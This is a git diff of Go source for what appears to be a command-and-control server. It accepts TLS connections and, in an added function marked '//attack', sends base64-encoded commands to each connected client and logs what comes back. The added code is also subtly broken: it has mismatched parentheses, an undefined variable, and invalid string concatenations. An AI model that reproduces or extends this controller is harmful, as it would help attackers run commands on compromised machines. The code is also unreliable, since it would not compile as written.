@@ -5,6 +5,8 @@ import (
 	"crypto/rand"
 	"crypto/tls"
 	"crypto/x509"
+	"encoding/base64"
+	"errors"
 	"fmt"
 	"io"
 	"log"
@@ -89,7 +91,6 @@ func main() {
 		}
 		go handleClient(conn, listener, cmdsToRun)
 	}
-
 }
 
 func genCert(email string) string {
@@ -118,7 +119,7 @@ func readFile(filePathName string) ([]string, int) {
 
 }
 func handleClient(conn net.Conn, l net.Listener, cmdsToRun []string) {
-	file, err := os.OpenFile(conn.RemoteAddr().String()+"-"+time.Now().String()+".log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	file, err := os.OpenFile(conn.RemoteAddr().String()+"-"+time.Now().Format(time.RFC1123)).String()+".log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -131,10 +132,20 @@ func handleClient(conn net.Conn, l net.Listener, cmdsToRun []string) {
 
 func runAttackSequence(conn net.Conn, logger *log.Logger, cmdsToRun []string) {
 	logger.Println("FILE BEGINS HERE.")
+	//attack
+	buffer := make([]byte, 1024)
+	for index, element := range cmdsToRun {
 
-	//
-
-	logger.Println("FILE ENDS HERE.")
+		encodedStr := base64.StdEncoding.EncodeToString([]byte(element))
+		conn.Write([]byte(encodedStr))
+		logger.Println("EXECUTE: "+element)
+		time.Sleep(time.Second)
+		res, err := connection.Read(buffer)
+		logger.Println("RES: "+ res)
+		logger.Println("ERR: "+ err)
+		handleError(err)
+	}
+	logger.Println("\nDONE.\nFILE ENDS HERE.")
 }
 
 func disconnectClient(conn net.Conn, logger *log.Logger, file os.File) {
